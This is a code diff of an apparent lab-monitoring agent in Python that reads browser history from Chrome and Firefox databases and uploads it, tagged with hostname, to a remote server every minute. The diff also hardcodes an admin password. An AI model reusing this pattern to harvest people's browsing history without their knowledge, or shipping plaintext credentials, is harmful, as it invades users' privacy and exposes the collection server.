@@ -13,11 +13,11 @@ import subprocess
 import psutil
 
 # --------- CONFIG ----------
-SERVER_URL = "https://tool-jc5z.onrender.com/upload"
+SERVER_URL = "https://tool-jc5z.onrender.com/upload"  # ✅ Your actual URL
 AUTH_USER = "admin"
-AUTH_PASS = "myStrongPassword123"  # Must match your server ADMIN_PASS  # ✅ Must match your Render ADMIN_PASS
+AUTH_PASS = "myStrongPassword123"  # ✅ Must match your server
 
-SLEEP_INTERVAL = 300  # 5 minutes
+SLEEP_INTERVAL = 60  # 1 minute for real-time updates
 LAB_NAME = os.getenv("LAB_NAME", "Lab-1")
 SYSTEM_NAME = socket.gethostname()
 ALLOWED_DOMAINS = ["110.172.151.102", "your-portal-domain.com"]
@@ -186,12 +186,12 @@ def extract_history(db_path, browser_name):
         
         # Try Chrome/Edge/Brave schema first
         try:
-            cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 1000")
+            cur.execute("SELECT url, title, last_visit_time FROM urls ORDER BY last_visit_time DESC LIMIT 500")  # Reduced limit
             rows = cur.fetchall()
         except sqlite3.OperationalError:
             # Try Firefox schema
             try:
-                cur.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 1000")
+                cur.execute("SELECT url, title, last_visit_date FROM moz_places ORDER BY last_visit_date DESC LIMIT 500")  # Reduced limit
                 rows = cur.fetchall()
             except sqlite3.OperationalError:
                 rows = []
@@ -230,8 +230,8 @@ def extract_history(db_path, browser_name):
             
             out.append({
                 "browser": browser_name,
-                "url": url[:500],  # Limit URL length
-                "title": title[:500],  # Limit title length
+                "url": url[:500],
+                "title": title[:500],
                 "timestamp": timestamp,
                 "system_name": SYSTEM_NAME,
                 "lab_name": LAB_NAME,
@@ -273,7 +273,23 @@ def save_buffer(data):
         print(f"[Agent] Error saving buffer: {e}")
 
 # ---------- UPLOAD SYSTEM ----------
-def send_to_server(records, chunk_size=200):
+def test_visibility():
+    """Test if data is visible in dashboard"""
+    try:
+        today = datetime.now().strftime("%Y-%m-%d")
+        test_url = f"https://tool-jc5z.onrender.com/data?date={today}&limit=5"
+        
+        response = requests.get(test_url, auth=(AUTH_USER, AUTH_PASS), timeout=10)
+        if response.status_code == 200:
+            data = response.json()
+            print(f"[Agent] 📊 Dashboard shows {len(data)} records for today")
+            if data:
+                latest_time = data[0].get('timestamp', 'Unknown')[:19]
+                print(f"[Agent] 📅 Latest record: {latest_time}")
+    except Exception as e:
+        print(f"[Agent] ❌ Visibility test failed: {e}")
+
+def send_to_server(records, chunk_size=50):  # Reduced chunk size for real-time
     if not records:
         print("[Agent] No records to send")
         return
@@ -292,7 +308,7 @@ def send_to_server(records, chunk_size=200):
             response = requests.post(
                 SERVER_URL,
                 json=chunk,
-                timeout=30,
+                timeout=45,  # Increased timeout
                 auth=(AUTH_USER, AUTH_PASS),
                 headers={'Content-Type': 'application/json'}
             )
@@ -300,17 +316,24 @@ def send_to_server(records, chunk_size=200):
             if response.status_code == 200:
                 print(f"[Agent] ✅ Successfully sent {len(chunk)} records")
                 sent += len(chunk)
+                
+                # Quick test to verify data is visible every few chunks
+                if sent % 100 == 0:  # Every 100 records
+                    test_visibility()
+                    
             else:
                 print(f"[Agent] ❌ Server error {response.status_code}: {response.text}")
                 save_buffer(all_records[sent:])
                 return
                 
-        except requests.exceptions.ConnectionError:
-            print(f"[Agent] ❌ Connection failed - server unreachable")
+        except requests.exceptions.Timeout:
+            print(f"[Agent] ⚠ Timeout, reducing chunk size...")
+            # Reduce chunk size on timeout
+            chunk_size = max(20, chunk_size // 2)
             save_buffer(all_records[sent:])
             return
-        except requests.exceptions.Timeout:
-            print(f"[Agent] ⚠ Request timeout")
+        except requests.exceptions.ConnectionError:
+            print(f"[Agent] ❌ Connection failed - server unreachable")
             save_buffer(all_records[sent:])
             return
         except Exception as e:
@@ -322,6 +345,9 @@ def send_to_server(records, chunk_size=200):
     if os.path.exists(BUFFER_FILE):
         os.remove(BUFFER_FILE)
         print("[Agent] ✅ Buffer cleared")
+    
+    # Final visibility test
+    test_visibility()
 
 # ---------- MAIN LOOP ----------
 def main():
